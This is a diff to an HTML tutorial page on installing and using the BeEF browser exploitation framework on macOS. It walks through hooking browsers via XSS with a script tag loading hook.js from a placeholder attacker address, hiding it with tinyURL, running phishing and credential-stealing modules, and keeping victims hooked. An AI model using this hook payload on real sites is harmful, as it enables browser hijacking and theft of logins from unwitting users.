@@ -27,6 +27,7 @@
 			<div>
 				<div class="jumbotron">
 					<h1>BeEF</h1>
+					<p>&quot;i say we take off and nuke the entire site from orbit.&quot; - Ripley</p>
 				</div>
 			</div>
 			<article>
@@ -36,16 +37,13 @@
 			<h3>Installation</h3>
 			<ol>
 				<li>Install Ruby 1.9, homebrew &#x26; xCode if not already installed</li>
-				<li>Install Bundler, in terminal:</li>
-				<div class="example2">sudo gem install bundler</div>
-				<li>CD into whatever folder you keep tools and clone BeEF</li>
-				<div class="example2">git clone https://github.com/beefproject/beef.git</div>
+				<li>Install Bundler, in terminal:<div class="example2">sudo gem install bundler</div></li>
+				<li>CD into whatever folder you keep tools and clone BeEF<div class="example2">git clone https://github.com/beefproject/beef.git</div></li>
 				<li>CD into BeEF folder</li>
 				<div class="example2">cd beef/</div>
-				<li>Run the BeEF install command</li>
-				<div class="example2">bundle install</div>
-				<li>The install mentions it but be sure to add ImageMagick if it is not already installed</li>
-				<div class="example2">brew update &#x26;&#x26; brew upgrade &#x26;&#x26; brew install imagemagick</div>
+				<li>Run the BeEF install command<div class="example2">bundle install</div></li>
+				<li>The install mentions it but be sure to add ImageMagick if it is not already installed<div class="example2">brew update &#x26;&#x26; brew upgrade &#x26;&#x26; brew install imagemagick</div></li>
+				
 			</ol>
 			<h3>Instructions</h3>
 			<p>BeEF&#x27;s actually very simple you start it by cd&#x27;ing into the beef folder and turn it on with 1 command</p>
@@ -64,11 +62,11 @@
 			<img src="../images/BeEF/BeEF2.png"  alt="Image of the details Screen." title="Details Screen" />
 			<p>Now check out the Commands sub-tab, here are all the exploits you can run against a hooked browser. I find Petty Theft and Google Phishing are probably the easiest way to demo how bad XSS is. </p>
 			<img src="../images/BeEF/BeEF3.png"  alt="Buttons to execute a command" title="Command buttons" />
-			<p>Select a command from the Module Tree and hit the Execute button in the bottom right of the module column. For simpler commands like Debug &#x3E; Return ascii characters, you simply hit select the command number in Module Results History and the information should come back 1-10 seconds later depending on connection speed. For Social Engineering commands you will not get a result until they submit the form (which would deliver back email and password, you probably shouldn&#x27;t let them fill it out with legitimate info) and you get nothing back if they cancel out. There&#x27;s other fun commands like playing sounds on Mobile Device or you can make your own custom sound to play on a computer, you can even Rick Roll people.</p>
+			<p>Select a command from the Module Tree and hit the Execute button in the bottom right of the module column. For simpler commands like Debug &gt; Return ascii characters, you simply hit select the command number in Module Results History and the information should come back 1-10 seconds later depending on connection speed. For Social Engineering commands you will not get a result until they submit the form (which would deliver back email and password, you probably shouldn&#x27;t let them fill it out with legitimate info) and you get nothing back if they cancel out. There&#x27;s other fun commands like playing sounds on Mobile Device or you can make your own custom sound to play on a computer, you can even Rick Roll people.</p>
 			<img src="../images/BeEF/BeEF4.png"  alt="See what comes back in results" title="Results Screen" />
 			<p>So that's the basics, now if you have a reflected or stored vulnerability,  you just drop in your BeEF hook (Hook URL mentioned in printed out when you launched)  in as a script. I suggest just using tinyURL to obfuscate it if the vulnerability is in the URL. Just use the hook URL:</p>
 			<div class="example2">
-				&#x3C;script type=&#x22;text/javascript&#x22; src=&#x22;http://##.##.##.##:####/hook.js&#x22;&#x3E;&#x3C;/script&#x3E;
+				&#x3C;script type=&#x22;text/javascript&#x22; src=&#x22;http://##.##.##.##:####/hook.js&#x22;&gt;&#x3C;/script&gt;
 			</div>
 			<p>There's ways you can hook the browser itself if they install extensions, for now the easiest way to keep somebody hooked in is to use the <a href="https://github.com/beefproject/beef/wiki/Persistence" target="_blank">Persistence</a> Modules in the Module Tree.  There's also a way you can setup a <a href="https://github.com/SpiderLabs/beef_injection_framework" target="_blank">listener</a> to automatically launch attacks when people get hooked by BeEF.</p>
 		</article>
